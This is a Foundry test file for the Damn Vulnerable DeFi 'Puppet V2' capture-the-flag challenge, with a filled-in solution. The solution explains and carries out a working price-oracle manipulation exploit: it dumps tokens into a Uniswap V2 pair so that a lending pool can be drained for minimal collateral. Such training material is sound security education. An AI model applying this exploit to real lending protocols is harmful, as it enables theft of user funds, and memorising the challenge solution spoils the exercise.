// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18; // 10 ether
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18; // 10K DVT Tokens
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18; // 20 ether
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        /*
            The vulnerability in the PuppetV2Pool challenge stems from the way the contract determines
            the quotation of the DamnValuableToken (DVT) token. It relies on a function called _getOracleQuote, 
            whichwhich calculates the deposit quotation using the balance of the uniswapV2 pair contract’s 
            reserves by uniswapV2Library function quote. The problem lies in the contract’s exclusive dependence on the balance of the 
            Uniswap pair to determine the token’s price. 

            Therefore the DVT tokens can be stolen from the PuppetPool by just 2 simple steps:

            1. Dump DVT Tokens into the UniswapV2 pool to effectively drop the price of DVT in that pool.
            therefore PuppetV2Pool contract now perceives DVT as being nearly worthless.

            2. Depoisit a very small ETH Collateral to be able to borrow (steal) all the DVT tokens from the PuppetV2Pool.

            *** INITIAL STATE (Before manipulating pool) ***

            User                UniswapV2
            ------------------------------------
            ETH         DVT     ETH         DVT
            20 ether    10_000  10 ether    100

            Price of 1_000_000 DVT == 300_000 ETH
            lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

            *** POST STATE (After manipulating pool) ***

            User                UniswapV2
            ------------------------------------
            ETH         DVT     ETH         DVT
            29.9 ether  0       0.1 ether   10_100

            Price of 1_000_000 DVT == 29.49 ETH (dramatically lower price!)
            lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        */

        console.log('---------- PRICE BEFORE SWAP ----------');
        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("ETH deposit required to borrow all DVT tokens: ", depositRequired); // 300_000 ETH

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE,  // amount in
            0,  // amount out min
            path,
            address(player), // to
            block.timestamp*2
        );
        console.log('---------- PRICE AFTER SWAP ----------');
        depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("ETH deposit required to borrow all DVT tokens: ", depositRequired); // 29.49 ETH

        // approve the tokens and borrow (steal) all the DVT tokens from the pool
        require(player.balance > depositRequired);
        weth.deposit{value: depositRequired}();
        weth.approve(address(lendingPool), depositRequired);
        
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
